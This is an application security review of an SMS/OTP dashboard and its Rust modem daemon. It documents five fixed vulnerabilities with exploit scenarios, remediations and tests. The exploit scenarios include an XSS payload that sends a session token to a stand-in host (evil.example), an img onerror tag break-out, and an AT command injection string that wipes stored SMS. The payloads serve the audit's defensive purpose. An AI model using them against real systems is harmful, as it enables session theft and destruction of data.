# Security Review — 2026-08-07

Full-application review: `sms-dashboard/server` (Workers API), `sms-dashboard/client`
(Svelte 5), `orange-pi-daemon` (Rust), `migrations/036`, `nixos-config`.

Every finding below was confirmed by reading the code path end to end. Findings raised
during review that did not survive verification are listed in
[Discarded findings](#discarded-findings) — they are recorded deliberately, so nobody
re-litigates them.

**Threat model that sets severity:** the `messages` table holds SMS bodies and an
extracted `verification_code` column for ~95 SIMs. Unauthorised read access means
harvesting one-time 2FA codes at scale. SMS bodies are *fully attacker-controlled* —
anyone who knows one of the phone numbers can inject arbitrary text into this database.

## Status

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | [RBAC is a no-op in production](#1-broken-access-control--rbac-is-a-no-op-in-production) | HIGH | **Fixed & verified in production** |
| 2 | [Stored XSS via unescaped keyword colour](#2-stored-xss-via-unescaped-keyword-colour) | HIGH | **Fixed** |
| 3 | [AT command injection via SMS recipient](#3-at-command-injection-via-unvalidated-sms-recipient) | HIGH | **Fixed** |
| 4 | [Session token in URL query string](#4-24-hour-session-token-placed-in-the-url-query-string) | MEDIUM | **Fixed & verified in production** |
| 5 | [Unnamespaced `roles` claim trusted first](#5-unnamespaced-roles-claim-trusted-ahead-of-the-namespaced-one) | MEDIUM | **Fixed** |

## Follow-up: admin/viewer split (done)

The fix for finding 1 left a single role granting all permissions, so
`requirePermission()` could not distinguish read from write. That has since been replaced
with two roles — see `config/auth0-roles.js` for the table.

| | viewer | admin |
|---|:--:|:--:|
| read messages, read SIM list, send SMS | ✅ | ✅ |
| ICCID writes, keywords, filters, user administration | ❌ | ✅ |

* **A second regression was caught doing this.** Routes use **10** permission strings but
  the list held **9** — `phones.write` was absent. Before the finding-1 fix it fell
  through the `includes()` wrapper and was *allowed*; afterwards it denied, which would
  have 403'd every ICCID-mapping write for everyone. `ALL_PERMISSIONS` is now asserted
  against the route inventory so an unlisted permission fails a test rather than
  production.
* New users are auto-assigned a **real** `sms-viewer` role in Auth0 on first login, after the
  verified-email and allowed-domain checks. Deliberately not "no role means viewer" —
  that would have re-opened finding 1 under a friendlier name, letting anyone with a
  verified address on the four allowed domains read every SMS and OTP. The gate still
  requires an explicit role, and provisioning failure denies login rather than
  continuing role-less.
* `PUT /api/users/:id/role` is a privilege-escalation primitive and is guarded
  accordingly: admin-only, a two-value role allow-list, **refusal to change your own
  role** (blocks self-lockout and self-promotion), and an audit row per change.
* Role changes now **revoke the target's live sessions** via a per-user session index —
  roles are snapshotted into the 24h session at login, so a demotion was previously
  invisible for a day. Bounded by KV eventual consistency (~60s), not instant.
* Fixed while wiring the route: the custom router passed raw `pathname` segments as
  params, so an Auth0 user id (`auth0|abc` → `auth0%7Cabc`) was double-encoded downstream
  and addressed the wrong user. Params are now decoded once, in the router.
* `messages.send` is granted to `sms-viewer` by explicit product decision — a viewer can
  originate SMS from any of the 95 SIMs. Recorded as a decision, not an oversight.
* New secrets: `AUTH0_M2M_CLIENT_ID` / `AUTH0_M2M_CLIENT_SECRET`, scoped to
  `read:users`, `read:roles`, `update:users` — **not** `delete:users`.
* Existing sessions carry `roles: ['sms']`, which now grants nothing, so everyone
  re-authenticates once.

Suites after this work: **270 JS / 181 Rust, 0 failures.**

---

## Deployment (2026-08-07)

Deployed to production and verified end to end: admin login with no `?token=` in the URL,
all five nav items from real permissions, an ICCID-mapping write succeeding (the
`phones.write` regression check), a second account auto-provisioned to `sms-viewer` seeing
only the messages page, and the daemon's API-key control path unaffected (heartbeat live,
93 modems, ingestion continuing).

Four defects surfaced *during* verification, none of which the unit suites caught:

1. **The Auth0 login application had been deleted**, so `AUTH0_CLIENT_ID` referenced a
   dead client and `/authorize` returned `400 Unknown client`. Unrelated to this work, but
   it blocked all verification until a new Regular Web Application was created and the
   secrets updated. Diagnosed by probing `/login` and following the redirect.
2. **`listUsers` was rate-limited (HTTP 429).** It requested each user's roles
   individually via `Promise.all`, so every lookup fired concurrently and tripped the
   Management API limit. Inverted to fetch *members per role* — a constant ~5 calls
   regardless of user count, issued sequentially. Real pagination added at the same time;
   the original silently capped at 100 users. Pinned by a test asserting the call count
   does not scale with user count.
3. **`api.js` discarded the server's `detail` field**, so an upstream failure surfaced as
   a bare "request failed" with the cause visible only in Worker logs. That is what made
   the 429 take two round trips to identify instead of one.
4. **`ErrorBoundary` claimed errors it did not own.** It registers *global* `window`
   error/rejection listeners, so a MetaMask extension failure blanked the dashboard — and
   `new Error(event.reason)` stringified the rejected object, producing the mangled
   `i: Failed to connect to MetaMask`. Foreign errors (extension protocol in filename or
   stack, `ResizeObserver` noise, opaque cross-origin `Script error.`) are now ignored and
   left un-`preventDefault`ed so they still reach the console. Pre-existing bug, not a
   regression from this work.

Suites after all of the above: **293 JS / 181 Rust, 0 failures.**

---

> ⚠️ **Historical — this was the pre-deploy gate for finding 1** (now satisfied). Retained
> because it is the checklist to re-run if the Auth0 tenant is ever rebuilt; every item is
> a silent-failure mode:
> 1. The post-login Action setting the `https://sexy.qzz.io/roles` claim is deployed and
>    **active in the Login flow**.
> 2. Both `sms-admin` and `sms-viewer` roles exist, and **you hold `sms-admin`** — the role UI is
>    admin-only and nobody can change their own role.
> 3. `AUTH0_M2M_CLIENT_ID` / `AUTH0_M2M_CLIENT_SECRET` are set, or viewer
>    auto-provisioning fails and denies login.
> 4. Real users' addresses are `email_verified` on one of the domains in
>    `ALLOWED_EMAIL_DOMAINS`.
>
> Recovery needs no redeploy — assign the role in Auth0 and log in again. Every denial
> writes a `login_denied` row to `audit_logs` with a `reason` saying which gate fired.

**Fix order.** 1 first — it is what turns 2 and 3 from privileged-insider issues into
any-user issues. Then 3 (reaches physical hardware and carrier billing), then 2. Fix 5
*in the same change as 1*, so re-enabling RBAC does not activate the weaker claim path.

---

## 1. Broken access control — RBAC is a no-op in production

* **Severity:** HIGH (confidence 10/10)
* **Category:** `broken_access_control`
* **Location:** `sms-dashboard/wrangler.toml:39`, `server/middleware/rbac.js:35,89-91`,
  `server/handlers/auth0.js:190`

### Description

`wrangler.toml:39` ships `USE_AUTH0_ROLES = "false"` with the comment *"TODO: re-enable
when RBAC is implemented"*. In `middleware/rbac.js:35`,
`const useAuth0Roles = env.USE_AUTH0_ROLES !== 'false'` evaluates to `false`, so the
entire role-checking block (lines 37–62) is skipped and `requirePermission()` falls
through to `return;` — an **allow** — for every permission it is ever asked to enforce.

Worse, `enrichUserPermissions()` lines 89–91 take the `else` branch and *explicitly*
grant the full `SMS_PERMISSIONS` array to every caller:

```js
} else {
  // Only grant permissions when Auth0 roles are explicitly disabled
  user.permissions = [...SMS_PERMISSIONS];
}
```

The login gate is disabled by the same flag. `handlers/auth0.js:190` reads
`if (!hasRole && env.USE_AUTH0_ROLES !== 'false')`, so a user with **no roles at all**
is issued a 24-hour session. The one remaining gate, `ALLOWED_EMAIL_DOMAINS`
(`handlers/auth0.js:146`), is commented out at `wrangler.toml:36` and therefore unset,
so the domain check is skipped too.

Net effect: **any principal who can complete an Auth0 login gets `messages.read`,
`messages.send`, and `keywords`/`filters` write+delete over all 95 SIMs.**

### Exploit scenario

1. Attacker completes an Auth0 login against the tenant (no role, any email domain) and
   receives a session token.
2. `GET /api/messages?limit=1000` with `Authorization: Bearer <token>` returns full SMS
   bodies plus the extracted `verification_code` column for every SIM.
3. OTP/2FA harvesting at scale. `POST /api/messages/send` also works, from any active SIM.

**Severity ceiling depends on one thing not visible in the repo: whether
self-registration is open on the Auth0 tenant.** If a database or social connection
permits signup (the common default), this is an internet-wide unauthenticated data
breach. If signup is closed, it remains a complete failure of the authorization model
the code is itself written to implement, with zero defence in depth.

### Recommendation

Do not simply flip the flag to `"true"` — the flag is the wrong shape.
`env.USE_AUTH0_ROLES !== 'false'` plus the `else` branch means a typo, a missing var, or
a stray string silently grants full access. Make the gate fail closed instead, and
remove any switch capable of disabling it.

### Fix applied

* `server/middleware/rbac.js` rewritten to fail closed: `enrichUserPermissions` defaults
  to `[]` and grants only on an explicit positive role match; `requirePermission` denies
  unless the role matches. **`USE_AUTH0_ROLES` and `AUTH0_ALLOW_NO_ROLES` are deleted
  outright** — both existed only to turn authorization off.
* Also closed a second fail-open found while fixing this: `requirePermission` previously
  wrapped its denial in `if (smsPermissions.includes(permission))`, so **any permission
  not in `SMS_PERMISSIONS` — e.g. `admin.destroy` — was allowed**. Unknown permissions
  now deny.
* `handlers/auth0.js`: the login role gate no longer has an env bypass, and now runs
  **before** the session is minted (previously a denied user still had a valid 24-hour
  KV session written).
* Email policy moved into `isEmailAllowed()` (`config/auth0-roles.js`) and now runs
  unconditionally: requires `email_verified`, compares whole domains
  case-insensitively, and reads the domain after the **final** `@`. The old check ran
  only when the list was set, split on the first `@`, and compared case-sensitively.
* `ALLOWED_EMAIL_DOMAINS = "poloniex.com,bitgc.io,tron.network,htx-inc.com"`.
* `AUTH0_ROLE_NAMESPACE` corrected to the full claim URI `https://sexy.qzz.io/roles`;
  the previous `https://sexy.qzz.io` was inert only because the claim key was hardcoded.
* Regression tests: `server/middleware/rbac.test.js` (20) and
  `config/auth0-roles.test.js` (21), including a case asserting the gate denies a
  roleless user for **every** value of the removed flag. Suite: 100 pass / 0 fail.
* Docs corrected — `docs/sms-dashboard/{auth0-roles-setup,enable-auth0-roles-quickstart,production-auth0-checklist}.md`,
  `sms-dashboard/README.md`, `sms-dashboard/docs/{ARCHITECTURE,API}.md` all previously
  instructed the reader to set the flag to `"false"` as an "emergency override" or
  "testing mode".

There is deliberately **no break-glass flag**. Recovery is an Auth0 dashboard role
assignment, which takes effect on next login without a redeploy.

---

## 2. Stored XSS via unescaped keyword colour

* **Severity:** HIGH (confidence 9/10)
* **Category:** `stored_xss`
* **Location:** `sms-dashboard/client/lib/MessageHighlight.svelte:55`,
  `server/api/keywords.js:171`, `server/handlers/keywords.js:134`

### Description

`MessageHighlight.svelte` builds an HTML string and renders it with
`{@html highlighted}` (line 70). The component is careful with two of its three
interpolations — `escapeHtml(m.tag)` and `escapeHtml(m.text)` — but **`m.color` is
interpolated raw** at line 55, and `escapeHtml` is exactly the function that would have
neutralised it (it escapes `"`, line 63):

```js
result += `<mark class="kw-hl" style="--kw-color: ${m.color}" title="${escapeHtml(m.tag)}">${escapeHtml(m.text)}</mark>`;
```

The value is never validated server-side: both `api/keywords.js:171` and
`handlers/keywords.js:134` accept `color || '#3B82F6'` and store whatever arrives.

Reachability confirmed: `/api/keywords` → `tag-store.js:46` →
`SimpleMessageView.svelte:179` passes `keywords={activeKeywords}` into the component.
Because finding 1 grants `keywords.write` to every authenticated user, this is a
**cross-user** stored XSS, not self-XSS.

### Exploit scenario

Attacker with any account calls `POST /api/keywords`:

```json
{
  "keyword": "code",
  "tag": "x",
  "color": "red\" onmouseover=\"fetch('https://evil.example/?d='+encodeURIComponent(localStorage.getItem('auth_token')))"
}
```

Line 55 then emits valid HTML with an attacker-controlled event handler:

```html
<mark class="kw-hl" style="--kw-color: red" onmouseover="fetch(...)" title="x">code</mark>
```

Any operator who views a message containing "code" (near-universal for OTP traffic) and
moves the mouse over the highlight ships their session token to the attacker. Full tag
break-out works equally well: `color = "x\"><img src=x onerror=alert(1)>"`.

### Recommendation

Validate server-side on write in **both** `api/keywords.js` and `handlers/keywords.js` —
reject anything not matching `/^#[0-9A-Fa-f]{3,8}$/` rather than sanitising.
Additionally harden the sink: since only the colour requires raw insertion, drop
`{@html}` entirely and render matches as real Svelte elements in an `{#each}` over the
`filtered` array, binding the colour with `style:--kw-color={m.color}` so Svelte escapes
it. That removes `{@html}` from a component whose whole job is displaying
attacker-supplied SMS text.

### Fix applied

Closed at three independent layers, so no single mistake reopens it.

1. **Sink removed.** `client/lib/MessageHighlight.svelte` no longer contains `{@html}`
   at all. Matches render as real `<mark>` elements and the colour binds via
   `style:--kw-color={...}`. Verified from the compiled bundle: the value is passed as a
   `{"--kw-color": ...}` object and applied with `element.style.setProperty()`, so it is
   never HTML-parsed and attribute break-out is structurally impossible regardless of
   the value.
2. **Client coercion.** `safeColor()` in the new `client/lib/message-highlight.js`
   forces anything that is not a plain hex literal to `#3B82F6`. This is deliberately a
   duplicate of the server rule, not an import: the client must not trust the server for
   a value it puts in a style attribute, and rows written before validation existed may
   hold anything.
3. **Server validation.** `server/utils/keyword-color.js` (`normalizeKeywordColor`)
   allow-lists `#RGB`/`#RGBA`/`#RRGGBB`/`#RRGGBBAA`, wired into **create and update** in
   the routed `server/api/keywords.js`. Create rejects a bad colour with 400. Update
   rejects a bad *supplied* colour with 400, but runs an omitted-colour fallback through
   the same check and defaults instead of 400ing — otherwise a row already holding a
   payload could never be edited via the API.

Also done:

* The slicing logic moved out of the `.svelte` file into `client/lib/message-highlight.js`
  so it is unit-testable, and the manual `regex.exec`/`lastIndex` loop became
  `matchAll`, which cannot spin on a zero-length match.
* The template is intentionally on one line: segments are adjacent runs of the original
  SMS text, so whitespace Svelte kept between block tags would insert spaces into
  displayed messages. A round-trip property test pins this.
* Tests: `server/utils/keyword-color.test.js` (17) and
  `client/lib/message-highlight.test.js` (27), the latter asserting that concatenating
  all segments exactly reproduces the input across 11 text shapes, plus the literal
  `red" onmouseover=...` and `x"><img src=x onerror=...` payloads. Suite: 162 pass.

**Note — unvalidated duplicate left in place.** `server/handlers/keywords.js` contains a
second, unrouted copy of the keyword write path (`keywordsHandler`) with no colour
validation. Nothing imports it (verified), so it is dead code and not currently
exploitable, but it is a trap: wiring it up would reintroduce this finding. It should be
deleted — flagged rather than removed here because it predates this review.

---

## 3. AT command injection via unvalidated SMS recipient

* **Severity:** HIGH (confidence 9/10)
* **Category:** `at_command_injection`
* **Location:** `sms-dashboard/server/handlers/messages.js:176`,
  `orange-pi-daemon/src/at_modem.rs:1554,1558`

### Description

`messages.js:176` validates `recipient` for **presence only** — there is no format or
character check:

```js
if (!phone_iccid || !recipient || !content) {
```

The value is stored (parameterised, so SQL is safe), fetched by the daemon as pending
work at `handlers/control.js:973`, and reaches `at_modem.rs:send_sms_sync`. Line 1548
branches on `use_ucs2`: only the non-ASCII path encodes the value, while the ASCII path
at line 1554 passes `recipient.to_string()` through **unmodified** into line 1558:

```rust
let cmd = format!("AT+CMGS=\"{}\"\r", encoded_recipient);
file.write_all(cmd.as_bytes())?;
```

A recipient containing `\r` terminates the `AT+CMGS` command; the remainder is parsed by
the modem as further AT commands. An ASCII payload deliberately stays in the unencoded
branch.

### Exploit scenario

Attacker (any authenticated user, per finding 1) sends `POST /api/messages/send`:

```json
{"phone_iccid":"<any active iccid>","content":"x","recipient":"+6512345678\r\nAT+CMGD=1,4\r"}
```

The daemon writes `AT+CMGS="+6512345678\r\nAT+CMGD=1,4\r` to the modem: the send fails,
then `AT+CMGD=1,4` executes and wipes all SMS stored on that SIM, destroying OTP records.
Substituting `AT+CMGS="<attacker number>"` lets the attacker originate SMS from any of
the 95 SIMs — carrier-billed toll fraud and sender-identity spoofing that bypasses the
application's own message logging, since the injected send never becomes a `messages` row.

### Recommendation

Validate at the trust boundary *and* at the sink:

* In `messages.js`, reject any `recipient` not matching `/^\+?[0-9]{6,15}$/` (E.164)
  before the INSERT.
* In `at_modem.rs`, do not rely on the caller: reject `\r`, `\n`, `"` and other control
  characters in **both** branches of line 1548, returning an error rather than silently
  sanitising, so a malformed number is visible rather than partially sent.

### Fix applied

Rejecting, never sanitising — stripping characters out of a phone number risks sending
the message to a *different* number than the caller asked for, and silently repairing a
payload destroys the evidence that someone tried.

* **Trust boundary** — `server/utils/recipient.js`: `normalizeRecipient()` allow-lists
  E.164 (`/^\+?[0-9]{6,15}$/`, anchored, `[0-9]` rather than `\d` so non-ASCII digit
  forms cannot pass). `handlers/messages.js` rejects with 400 before the INSERT and
  stores the **normalised** value; `body.recipient` is never referenced again.
  * Only trims spaces and tabs, deliberately **not** `String.trim()`: trim also strips
    CR/LF, so `"+6512345678\r\nAT+CMGD=1,4\r"` would have normalised to a valid number
    and returned 200, silently discarding an injection attempt.
* **Sink** — `orange-pi-daemon/src/at_modem.rs`: `validate_recipient()` and
  `validate_message_body()`, enforced in `send_sms` *and* again in `send_sms_sync`
  (the function that actually writes to the serial port).
* **Common choke point** — `modem_manager.rs::send_sms` validates for both the AT and
  D-Bus backends. The D-Bus path passes typed arguments and is not injectable, but it
  should not accept a malformed number either.
* **A second vector found while fixing this:** the message *body* is terminated by
  Ctrl-Z (`format!("{}\x1A", encoded_message)`), so a literal `0x1A` inside the body
  ends SMS entry early and returns the modem to command mode — making every trailing
  byte an AT command. `validate_message_body()` rejects `0x1A`, `0x1B` (ESC, aborts
  entry) and NUL, while still allowing newlines, since a multi-line SMS body is normal.
* Tests: `server/utils/recipient.test.js` (18) and four Rust tests in `at_modem.rs`,
  both using the literal `+6512345678\r\nAT+CMGD=1,4\r` payload. JS suite 118 pass;
  Rust suite 181 pass.

---

## 4. 24-hour session token placed in the URL query string

* **Severity:** MEDIUM (confidence 8/10)
* **Category:** `token_exposure`
* **Location:** `sms-dashboard/server/handlers/auth0.js:198`

### Description

The OAuth callback sets the bearer session token as a query parameter and redirects the
browser to it:

```js
frontendUrl.searchParams.set('token', sessionToken);
```

The same token is simultaneously issued as a properly hardened cookie on line 206
(`HttpOnly; Secure; SameSite=Lax`), so the URL copy defeats the protection the cookie
was written to provide. A token in a URL lands in browser history, is exposed to any
script that reads `location`, and is forwarded in the `Referer` header on outbound
navigation. It is also captured by Workers request logging, enabled at
`wrangler.toml:46-47`. The token is a valid 24-hour credential accepted directly by
`middleware/auth0.js:32`.

### Exploit scenario

An operator completes login and lands on `https://sexy.qzz.io/?token=<session>`. They
click any external link, or an attacker gets one image from an external host rendered —
the full URL including the live token travels in `Referer` to that third party, who
replays it as `Authorization: Bearer <token>` to read all SMS bodies for the remaining
session lifetime. Also recoverable from shared-machine browser history and Cloudflare
log retention.

### Recommendation

Rely solely on the existing `HttpOnly` cookie and delete the `token` query parameter. If
the SPA must hold the token in JS, return it in the response body of a `POST` exchange
the client makes after the redirect. A client-side `history.replaceState()` is **not** a
fix — it does not undo the `Referer` or server-log exposure.

### Fix applied

Switched to cookie-only authentication. These two changes are coupled: removing the URL
parameter necessarily means moving to the cookie, because the query string was the SPA's
only other way to obtain a credential. Echoing the token back from an endpoint was
rejected as strictly worse — it would hand a live credential back to JavaScript and
defeat `HttpOnly` for no benefit.

* `handlers/auth0.js`: the callback no longer sets `?token=`; the session is delivered
  **only** as the existing `HttpOnly; Secure; SameSite=Lax` cookie.
* `middleware/auth0.js`: credential now read via `extractSessionToken()`, which prefers
  the `auth_token` cookie and falls back to an `Authorization: Bearer` header so a
  programmatic caller can still present an Auth0 JWT.
* Client: **no token exists in JavaScript any more.** `auth.js` drops
  `localStorage`/`this.token` entirely, `api.js` sends `credentials: 'same-origin'` and
  no `Authorization` header, the URL-token pickup block is gone, and `getAuthToken()` was
  removed. `App.svelte`'s five `auth.token` truthiness gates now key off `user`, and the
  `handleCallback()` step is gone — asking `/api/auth/me` is the only check.
  * Side effect worth noting: with the token no longer in `localStorage`, a future XSS
    could not exfiltrate it.
* `logout` previously read only the `Authorization` header, so a **browser logout never
  deleted the KV session** — it stayed valid for the full 24 hours. It now reads the
  cookie too and expires the cookie with `Max-Age=0`.
* `server/index.js` used a second, inline cookie parser: `authCookie.split('=')[1]`
  truncates any value containing `=`, and `startsWith('auth_token=')` would also match a
  differently-named cookie. Both call sites now share `readCookie()`.
* Tests: `server/utils/session-token.test.js` (11), covering `=` inside values and
  prefix-confusion names like `xauth_token` / `auth_token_backup`. Suite: 173 pass; both
  the Worker and client bundles build.

⚠️ **Needs a real login test before deploy.** This reworks the login flow and cannot be
exercised locally without the Auth0 tenant. Verify: log in, confirm the landing URL has
no `?token=`, confirm API calls succeed, then log out and confirm the session is dead.

Two dev-only files still poke at the removed `localStorage` key and are now inert —
`sms-dashboard/dev-mock-auth.html` and `client/debug-messages.html`. Harmless, but they
will not authenticate anything.

---

## 5. Unnamespaced `roles` claim trusted ahead of the namespaced one

* **Severity:** MEDIUM (confidence 8/10)
* **Category:** `privilege_escalation`
* **Location:** `sms-dashboard/server/middleware/auth0.js:68`

### Description

Role extraction prefers the **unnamespaced** `roles` claim:

```js
roles: jwtPayload.roles ||
       jwtPayload['https://sexy.qzz.io/roles'] ||
       jwtPayload['https://sexy.qzz.io/app_metadata']?.roles ||
       []
```

Auth0 strips unnamespaced custom claims from tokens it mints, which is why this is not
currently exploitable — and it is doubly inert today because finding 1 means roles are
never consulted. It matters because it sits **directly on the remediation path for
finding 1**: the moment `USE_AUTH0_ROLES` is set to `true`, this ordering becomes the
authorization decision, and any Auth0 rule/action, custom claim, or connection mapping
that lets a user influence a top-level `roles` claim converts into instant self-promotion
to the `sms` role.

### Exploit scenario

After RBAC is re-enabled, a user who can set profile or `user_metadata` fields that an
Auth0 action copies to a top-level `roles` claim authenticates with
`{"sub":"...","roles":["sms"]}`. `hasSmSAccess()` matches, and `enrichUserPermissions`
grants all nine SMS permissions to a user the operator never authorised.

### Recommendation

Read **only** the namespaced claim — `jwtPayload['https://sexy.qzz.io/roles']` — and
delete the `jwtPayload.roles` fallback. Namespacing exists precisely so the claim cannot
collide with anything a user controls; the fallback discards that guarantee.

### Fix applied

* Claim extraction centralised in `rolesFromToken()` (`config/auth0-roles.js`), which
  reads **only** `config.ROLE_CLAIM` and returns `[]` for a non-array claim or non-string
  entries. All three call sites (`middleware/auth0.js`, `handlers/auth0.js`,
  `server/index.js`) now go through it, so they cannot drift apart.
* A worse variant was found in the login callback while fixing this: it
  **base64-decoded the access token with `atob` and no signature verification**, then
  read `payload.roles` from it — and those roles are persisted into the KV session, so
  they are a live authorization input. It now calls `verifyToken()` (full JWKS + issuer +
  audience) and reads the namespaced claim from the verified payload; on failure it
  yields `[]` and the role gate denies.
* `hasSmSAccess()` now returns `false` for any non-array `roles`, so a scalar or object
  claim cannot throw or coerce its way past the check.
* Covered by `config/auth0-roles.test.js`, including cases asserting a top-level
  `roles: ['sms']` claim is ignored even when the namespaced claim is absent.

---

## Discarded findings

Recorded because each was raised during review and did **not** survive verification.

* **CORS `*` + `Allow-Credentials: true`** (`middleware/cors.js:4-7`) — a real spec
  violation, but **not exploitable here**. The API authenticates via the `Authorization`
  header only, and cross-origin JS cannot read a victim's token to forge it. The one
  cookie-authenticated route (`index.js:381`, `GET /`) is unreachable this way because
  browsers refuse credentialed requests against `Access-Control-Allow-Origin: *`, and it
  returns only the HTML shell or a redirect to `/login`. Worth tidying; not a breach path.
* **SQL injection in the messages count query** (`handlers/messages.js:45,66-69`) —
  **false positive.** `conditions.push('phone_iccid = ?')` pushes a literal `?`; the user
  value goes to `scopeParams` and is applied by `.bind(...scopeParams)`. The only
  interpolations are `FILTER_STATUS.FILTERED` (a module constant) and
  `VISIBLE_FILTER_STATUSES.map(() => '?')` (literal placeholders). No user data ever
  enters the SQL string.
* **JWT verification** (`handlers/auth0.js:249-263`) — correct. `jose.jwtVerify` with
  `createRemoteJWKSet`, plus `issuer` and `audience` validation; algorithm confusion and
  `alg:none` are precluded by the JWKS key type.
* **Missing object-level authorization on `phone_iccid`** — not a distinct vulnerability.
  Single-tenant SIM farm, no per-user phone-ownership concept anywhere in the schema. The
  real defect is that unauthorised people become authenticated users at all — finding 1.
* **Timing-unsafe API-key comparison** — theoretical in JS (string comparison, no
  measurable oracle over the network).
* **`/api/control/*` not wrapped at the router level** — not a bypass.
  `middleware/auth0.js:8` gates that prefix and requires `X-API-Key`. Maintenance hazard
  (a future control route added without the check would be open), not a current vuln.
* **Migration `036_fix_message_tags_fk.sql`** — sound, and a net security
  **improvement**. Preserves rows via `INSERT ... SELECT`, restores
  `FOREIGN KEY (message_id) REFERENCES messages(id) ON DELETE CASCADE`, recreates the
  canonical indexes. Repairing that cascade is what makes the 12-month retention cron
  actually delete expired SMS instead of silently failing — closing an indefinite-retention
  exposure of OTPs and PII.
* **Committed secrets** — none found. The detection regex was validated against a
  synthetic JWT/AWS-key canary to confirm it matches before the empty result was trusted.
  `wrangler.toml` holds only non-secret IDs; secrets are documented as
  `wrangler secret put`.

## Open follow-up: OAuth `state` is generated but never validated

* **Severity:** MEDIUM (login CSRF / session fixation)
* **Location:** `server/handlers/auth0.js` — `login()` sets
  `authUrl.searchParams.set('state', nanoid())`; `callback()` reads
  `url.searchParams.get('state')` into a variable that is never compared to anything.

`state` exists to bind the authorization request to the browser that started it. Because
the value is never stored (there is nothing to compare against) and never checked, an
attacker can feed a victim a crafted `/callback?code=...` URL and complete a login *as the
attacker* in the victim's browser — the victim ends up holding an attacker-controlled
session, which is a plausible route to seeing SMS content the attacker sends themselves,
or to a confused-deputy action.

Not exploited by anything in this review and deliberately out of scope for it, but it is a
real gap in the same file. Fixing it means persisting the `state` (a short-TTL KV entry, or
a signed `HttpOnly` cookie set in `login()`) and rejecting a callback whose `state` does
not match. The unused-variable lint on that line is the tell.

## Unresolved — needs on-device confirmation

`nixos-config/orange-pi/configuration.nix:51` sets `networking.firewall.enable = false`
under a comment reading *"Modern nftables firewall configuration"* — but `nftables`
appears **nowhere else in the repo** (grep validated against a control term). The
intended replacement firewall was never configured, so this host, which has a public IP
(`203.116.95.146`), likely has no host packet filter.

Not ranked as a numbered finding because the set of listening services could not be
enumerated from the repo alone, and SSH itself is genuinely well hardened
(`AuthenticationMethods = "publickey"`, no password auth). **Confirm on the device with
`ss -tlnp`** — if the daemon or anything else binds a non-loopback port, this becomes
significant.

Note also `services.fail2ban.enable = false` (line 104) despite a fully populated jail
config below it — the same pattern of intended-but-unactivated controls.
